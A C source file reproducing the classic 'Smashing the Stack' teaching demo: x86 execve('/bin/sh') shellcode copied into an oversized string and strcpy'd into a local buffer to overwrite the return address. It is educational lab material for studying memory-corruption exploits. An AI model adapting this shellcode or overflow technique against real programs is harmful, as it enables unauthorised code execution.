// gcc -ggdb -mpreferred-stack-boundary=2 -o overflow_execve overflow_execve.c -z execstack

// Buffer overflow exploit with execve shellcode payload
// From Smashing the Stack for Fun and Profit
// requires -z execstack

#include <string.h>

// execve /bin/sh; exit 0
// null chars removed
char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

char large_string[128];

void main() {
  char buffer[96];
  int i;
  long *long_ptr = (long *) large_string;

  // fill large_string with the address of buffer (128 = 32 * 4),
  // which will contain shellcode
  for (i = 0; i < 32; i++)
    *(long_ptr + i) = (int) buffer;

  // copy shellcode to the start of large_string
  for (i = 0; i < strlen(shellcode); i++)
    large_string[i] = shellcode[i];

  // buffer overflow. it is very likely that one of the copies of buffer's
  // address will have smashed ret.
  // this works because we know the address of large_string. IRL the challenge
  // is finding the address of the buffer (and therfore our shellcode).
  strcpy(buffer,large_string);
}
